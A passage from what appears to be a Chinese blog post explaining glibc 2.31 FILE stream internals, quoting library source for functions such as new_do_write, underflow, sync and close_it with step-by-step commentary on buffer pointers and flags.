class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><p>如果to_do==0直接返回1</p><p>否则调用new_do_write (fp, data, to_do)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);<span class="comment">//读写平衡</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)<span class="comment">//计算最后一行第几列</span></span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>如果_IO_IS_APPENDING被置位，说明文件对象是以追加方式打开的，所以将fp-&gt;_offset赋值为_IO_pos_BAD，即定位到文件末尾；</p></li><li><p>如果不是追加模式，就要考虑读写buffer块地址的信息了，读的尾指针不等于写的基指针，说明之前读写过程不一致，现在我们需要写入信息，所以需要调用_IO_SYSSEEK进行调整，基于当前的位置（1表示SEEK_CUR）将两者调整到一致。</p><ul><li>如果返回结果是异常的-1，那就直接返回0，表示写入字节数为0.</li><li>否则使用新的位置信息更新fp-&gt;_offset</li></ul></li><li>调用系统调用_IO_SYSWRITE (fp, data, to_do);</li><li>如果当前列参数不等于0(即第一列)，而且写入的字符数不等于0，此时需要更新列参数，调用_IO_adjust_column函数实现。</li><li>调用_IO<em>setg将读相关的base、ptr、end更新为_IO_buf_base；然后将写相关的base、ptr更新为_IO_buf_base。</em></li></ul><p>注意最后的w-end会根据当前的模式选择是等于_IO_buf_base还是_IO_buf_end：</p><ul><li>如果fp-&gt;_mode &lt;= 0，说明是标准字符，fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)说明是按行为buffer单位或没有缓存buffer，这种情况将写end置为_IO_buf_base，即无法使用buffer，否则则是可以使用buffer的情况，置为_IO_buf_end，可以使用base到end这块空间作为写缓存。</li></ul><p>看一下col调整函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>就是更新最后一行的列</p><ul><li><p>首先ptr指向真正写入的最后一个字符；</p></li><li><p>当ptr大于line，即从后向前遍历字符，如果找到换行符，则结束，说明之前遍历的位于写入的最后一行，此时line + count - ptr - 1表示最后一行的字符数，返回该值即可；</p></li><li><p>如果没有找到换行符，那就返回start + count，即之前的列号加真正写入的字符数。</p></li></ul><p>最后在外层再加1得到当前行的列号，整体的逻辑就是要更新当前的列号。</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p>就是调用系统调用</p><h2 id="seek"><a href="#seek" class="headerlink" title="seek"></a>seek</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_file_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __lseek64 (fp-&gt;_fileno, offset, dir);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_seek)</span><br></pre></td></tr></table></figure><p>seek就是调用lseek</p><p>返回成功后的偏移地址如果错误返回-1</p><h2 id="stat-1"><a href="#stat-1" class="headerlink" title="stat"></a>stat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_stat (FILE *fp, <span class="type">void</span> *st)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fxstat64 (_STAT_VER, fp-&gt;_fileno, (<span class="keyword">struct</span> stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure><p>调用stat系统调用</p><p>返回一个stat结构体</p><h2 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h2><p>underflow主要负责从文件中读取数据到缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//注意读的大小是缓冲区的大小,这意味r-end可能会向后移动很多,从而导致读写不一致(_offset偏后)</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><ol><li><p>如果已经到达文件末尾返回EOF</p></li><li><p>如果文件不允许读,设置错误并返回EOF</p></li><li><p>如果r-ptr&lt;r-end返回r-ptr指向的字符</p></li><li><p>如果buf为空</p><ul><li>如果_IO_save_base不为空先将其释放,并取消_IO_IN_BACKUP标志位</li><li>申请buf</li></ul></li><li><p>如果是行缓冲或无缓冲模式</p><ul><li>给stdout上锁</li><li>如果stdout是行缓冲且在_IO_list_all链上且不禁止写,对stdout调用overflow</li><li>将stdout解锁</li></ul></li><li><p>调用_IO_switch_to_get_mode (fp);</p></li><li><p>更新读写缓冲区所有指针为fp-&gt;_IO_buf_base</p></li><li><p>调用系统调用_IO_SYSREAD(fp, fp-&gt;_IO_buf_base,</p><p>​      fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</p></li><li><p>,返回值为count</p></li><li><p>如果count&lt;=0</p><ul><li>如果count为0,文件标志设置到达末尾</li><li>如果count小于0,设置错误标志,并将count置为0</li></ul></li><li><p>r-end向后移动count</p></li><li><p>如果count为0,将fp-&gt;_offset设置为-1(文件末尾)并返回EOF</p></li><li><p>如果fp-&gt;_offset不为-1,fp-&gt;_offset移动到当前位置向后count字节</p></li><li><p>返回r-ptr指向的字符</p></li></ol><p>看以下其中调用的_IO_switch_to_get_mode (fp);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_get_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_get_mode)</span><br></pre></td></tr></table></figure><ol><li>如果w-ptr&gt;w-base说明输出缓冲区还有数据尚未写入文件,调用_IO_OVERFLOW (fp, EOF)</li><li>如果处于备份模式fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;<ul><li>否则fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;<ul><li>如果w-ptr&gt;r-end,r-end=w-ptr</li></ul></li></ul></li><li>r-ptr被赋值为w-ptr,write的所有指针置为r-ptr</li><li>取消文件流的_IO_CURRENTLY_PUTTING标志位</li></ol><p>感觉有些指针操作有些多余了,underflow外层中都会统一更新赋值</p><h2 id="uflow"><a href="#uflow" class="headerlink" title="uflow"></a>uflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><ol><li>调用underflow</li><li>如果underflow返回值为EOF,返回EOF</li><li>否则返回fp-&gt;_IO_read_ptr处的字符</li></ol><h2 id="sync-1"><a href="#sync-1" class="headerlink" title="sync"></a>sync</h2><p>sync负责平衡读写,将未写入的数据写入文件,将未读取的数据去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;<span class="comment">//读平衡,真正只读到ptr,但实际读到end</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);<span class="comment">//将多余的去除</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;<span class="comment">//平衡</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><ol><li>如果write缓冲区有未写入的,调用_IO_do_flush不成功写入或写入不完全则直接返回EOF</li><li>平衡read指针</li></ol><h2 id="imbue"><a href="#imbue" class="headerlink" title="imbue"></a>imbue</h2><p>在2.31中是个空函数</p><h2 id="showmanyc"><a href="#showmanyc" class="headerlink" title="showmanyc"></a>showmanyc</h2><p>在2.31中是个空函数</p><h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭文件流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><ol><li>如果文件不处于打开状态,直接返回</li><li>如果文件不禁止写且正处于写入模式,调用_IO_do_flush,否则设置write_status = 0</li><li>调用_IO_unsave_markers (fp);</li><li>如果文件未设置_IO_FLAGS2_NOCLOSE,调用sysclose关闭文件描述符</li><li>如果文件为宽字符模式,对宽字符缓冲进行处理</li><li>设置缓冲区指针为null</li><li>调用_IO_un_link解链文件</li><li>设置标志位,设置偏移基址为末尾设置文件描述符</li><li>返回close_status ? close_status : write_status;</li></ol><h2 id="doallocate"><a href="#doallocate" class="headerlink" title="doallocate"></a>doallocate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span 